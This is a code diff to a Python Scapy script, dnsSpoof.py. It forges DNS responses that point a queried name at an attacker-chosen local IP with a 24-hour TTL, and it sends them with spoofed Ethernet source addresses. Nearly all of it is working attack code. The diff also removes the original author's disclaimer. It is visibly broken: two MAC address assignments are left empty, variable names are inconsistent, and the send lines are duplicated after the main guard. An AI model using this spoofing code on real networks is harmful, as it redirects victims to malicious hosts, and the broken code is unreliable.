@@ -1,10 +1,6 @@
 #!/usr/bin/env python
-# This code is strictly for demonstration purposes. 
-# If used in any other way or for any other purposes. In no way am I responsible 
-# for your actions or any damage which may occur as a result of its usage
+# code inspired by Nik Alleyne (https://www.securitynik.com/2014/05/building-your-own-tools-with-scapy.html)
 # dnsSpoof.py
-# Author: Nik Alleyne - nikalleyne at gmail dot com 
-# http://securitynik.blogspot.com
 
 from os import uname
 from subprocess import call
@@ -51,6 +47,13 @@ def main():
     pass
     # I'm not tryint to figure out what you are ... moving on
    
+   clientHwAddr = 
+
+   spoofedHwAddr = 
+
+   spoofedEtherPkt = Ether(src=spoofedHwAddr,dst=clientHwAddr)
+
+
    # Extract DNS Query ID. The Query ID is extremely important, as the response's Query ID must match the request Query ID
    clientDNSQueryID = DNSPacket[0].getlayer(DNS).id
    
@@ -88,13 +91,30 @@ def main():
    # opcode: the type of query (0 for standard). According to RFC, "This value is set by the originator of a query
    #  and copied into the response."
    # RFC: "Authoritative Answer - this bit is valid in responses"
-   spoofedDNSPakcet = DNS(id=clientDNSQueryID,qr=1,opcode=DNSPacket[0].getlayer(DNS).opcode,aa=1,\
-    #
-                          rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=0,arcount=0,qd=DNSQR(qname=clientDNSQuery,qtype=DNSPacket[0].getlayer(DNS).qd.qtype,qclass=DNSPacket[0].getlayer(DNS).qd.qclass))
+   # spoofedDNSPakcet = DNS(id=clientDNSQueryID,qr=1,opcode=DNSPacket[0].getlayer(DNS).opcode,aa=1,\
+   #  #
+   #                        rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=0,arcount=0,qd=DNSQR(qname=clientDNSQuery,qtype=DNSPacket[0].getlayer(DNS).qd.qtype,qclass=DNSPacket[0].getlayer(DNS).qd.qclass))
+   spoofedDNSPakcet = DNS(id=clientDNSQueryID,qr=1,opcode=getDNSPacket[0].getlayer(DNS).opcode,\
+   aa=1,rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=1,arcount=1, \
+   qd=DNSQR(qname=clientDNSQuery,qtype=getDNSPacket[0].getlayer(DNS).qd.qtype,qclass=getDNSPacket[0].getlayer(DNS).qd.qclass),\
+   an=DNSRR(rrname=clientDNSQuery,rdata=fakeLocalIP,ttl=86400),ns=DNSRR(rrname=clientDNSQuery,type=2,ttl=86400,rdata=fakeLocalIP),\
+   ar=DNSRR(rrname=clientDNSQuery,rdata=fakeLocalIP))
    
    # Now that we have built our packet, let's go ahead and send it on its merry way.
    print(' \n Sending spoofed response packet ')
-   sendp(Ether()/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPakcet,iface=s1iface, count=1)
+   sendp(spoofedEtherPkt/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPakcet,iface=s1iface, count=1)
+   print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' %(spoofedDNSServerIP, 53, clientSrcPort ))
+
+  else:
+   pass
+
+
+if __name__ == '__main__':
+ main()
+   
+   # Now that we have built our packet, let's go ahead and send it on its merry way.
+   print(' \n Sending spoofed response packet ')
+   sendp(spoofedEtherPkt/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPakcet,iface=s1iface, count=1)
    print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' %(spoofedDNSServerIP, 53, clientSrcPort ))
 
   else:
